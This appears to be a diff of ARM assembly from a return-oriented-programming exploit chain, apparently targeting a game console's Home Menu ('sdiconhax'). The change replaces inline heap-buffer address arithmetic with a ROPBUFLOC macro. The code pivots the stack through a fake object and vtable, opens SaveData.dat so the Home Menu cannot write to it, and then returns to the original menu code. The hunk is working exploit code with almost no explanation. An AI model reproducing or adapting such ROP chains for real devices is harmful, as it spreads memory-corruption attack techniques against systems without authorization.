@@ -58,21 +58,21 @@ ROPMACRO_LDDRR0_ADDR1_STRADDR SDICONHAX_SPRETADDR, SDICONHAX_SPRETADDR, 0xffffff
 @ The ROP used for RET2MENU starts here.
 
 @ Open the SaveData.dat extdata for reading without doing anything with it besides opening it. This blocks the actual Home Menu code from writing to SaveData.dat, since fsuser doesn't allow writing to files which are currently open for reading.
-CALLFUNC_NOSP IFile_Open, (HEAPBUF + (savedatadat_filectx - _start)), (HEAPBUF + (savedatadat_filepath - _start)), 0x1, 0
+CALLFUNC_NOSP IFile_Open, ROPBUFLOC(savedatadat_filectx), ROPBUFLOC(savedatadat_filepath), 0x1, 0
 
 ROPMACRO_STACKPIVOT SDICONHAX_SPRETADDR, POP_R4R8PC @ Return to executing the original homemenu code.
 
 object:
-.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
+.word ROPBUFLOC(vtable) @ object+0, vtable ptr
 .word 0
 .word 0
 .word 0
 
-.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
 
 .space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
 stackpivot_sploadword:
-.word HEAPBUF + (ropstackstart - _start) @ sp
+.word ROPBUFLOC(ropstackstart) @ sp
 stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
